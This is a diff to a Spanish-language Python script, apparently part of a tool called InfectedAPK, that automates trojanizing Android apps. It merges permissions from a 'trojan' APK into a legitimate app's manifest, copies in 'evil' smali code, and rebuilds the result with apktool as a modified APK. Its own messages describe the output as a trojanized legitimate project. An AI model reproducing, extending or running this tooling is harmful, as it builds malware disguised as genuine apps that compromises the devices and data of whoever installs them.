@@ -128,7 +128,7 @@ def menu_linux_descomprimir_apk(ruta_apks):
         print(f"\nHa seleccionado descomprimir: {apk_seleccionado}")
 
         apk_path = os.path.join(ruta_apks, apk_seleccionado)
-       
+        
         # Descomprimir el archivo .zip directamente al directorio
         resultUnzipCompressedApk = subprocess.run(["unzip", "-j", apk_path, "-d", ruta_apks])
 
@@ -330,16 +330,59 @@ def usesPermission(ruta_directorio_troyano, carpeta_path):
 
     permissionsArray = [line.lstrip() for line in grep_result.stdout.strip().split('\n')]
     print(permissionsArray)
-    print(f"\n")
 
-    with open(ruta_apk_legit_AndroidManifest, "r") as manifest_file:
-        lines = manifest_file.readlines()
-        last_permission_line_index = max((i for i, line in enumerate(lines) if '<uses-permission' in line), default=-1)
-        lines.insert(last_permission_line_index + 1, '\n'.join(permissionsArray) + '\n')
+    try:
+        with open(ruta_apk_legit_AndroidManifest, "r") as manifest_file:
+            lines = manifest_file.readlines()
+            last_permission_line_index = max((i for i, line in enumerate(lines) if '<uses-permission' in line), default=-1)
+            lines.insert(last_permission_line_index + 1, '\n'.join(permissionsArray) + '\n')
 
-    with open(ruta_apk_legit_AndroidManifest, 'w') as manifest_file:
-        manifest_file.writelines(lines)
-        print(last_permission_line_index)
+        with open(ruta_apk_legit_AndroidManifest, 'w') as manifest_file:
+            manifest_file.writelines(lines)
+
+    except Exception as e:
+        print(f"Error al intentar modificar el AndroidManifest.xml: {e}")
+
+def compileModifyApk(ruta_apks):
+    
+    if not os.path.exists(ruta_apks):
+        print(f"\nError: La ruta {ruta_apks} no existe.\n")
+        return
+
+    # Obtener los directorios dentro de la ruta, pero excluir 'trojan' si existe
+    directorios = [d for d in os.listdir(ruta_apks) if os.path.isdir(os.path.join(ruta_apks, d)) and d.lower() != 'trojan']
+
+    if not directorios:
+        print(f"\nNo se encontraron proyectos en la ruta {ruta_apks} (excluyendo 'trojan').")
+        return
+
+    print("\nProyectos a compilar disponibles:")
+    for idx, directorio in enumerate(directorios, start=1):
+        print(f"{idx}. {directorio}")
+
+    try:
+        seleccion = int(input("\nSeleccione el número del proyecto a compilar: "))
+        if seleccion < 1 or seleccion > len(directorios):
+            print("Selección inválida.")
+            return
+
+        # Obtener el directorio seleccionado
+        directorio_seleccionado = directorios[seleccion - 1]
+        print(f"\nHa seleccionado el proyecto: {directorio_seleccionado}")
+
+        ruta_directorio_seleccionado = os.path.join(ruta_apks, directorio_seleccionado)
+        print(f"Ruta del proyecto seleccionado: {ruta_directorio_seleccionado}")
+
+        resultCompileNewApk = subprocess.run(["apktool", "b", ruta_directorio_seleccionado , "-o", ruta_directorio_seleccionado+"_modified"])
+            
+        if resultCompileNewApk.returncode == 0:
+            print(f"\nProyecto legítimo a troyanizar compilado con éxito.\n")
+        else:
+            print(f"\nError al compilar el proyecto legítimo a troyanizar.")
+            sys.exit(1)
+
+    except ValueError:
+        print("\nEntrada inválida. Por favor ingrese un número.")
 
 def verificar_programa_windows(programa):
     result_verificar_programas_windowsx = subprocess.run(["where", programa])
@@ -417,6 +460,8 @@ def main():
             ruta_apks = "/home/Documents/InfectedAPK/APKs"
             ruta_trojan_apk = "/home/Documents/InfectedAPK/APKs/trojan/"
             copyEvilSmali(ruta_apks, ruta_trojan_apk)
+
+            compileModifyApk(ruta_apks)
 
         elif sistema == "nt":
             repoUrl = "https://github.com/APKentiTEAM/InfectedAPK.git"
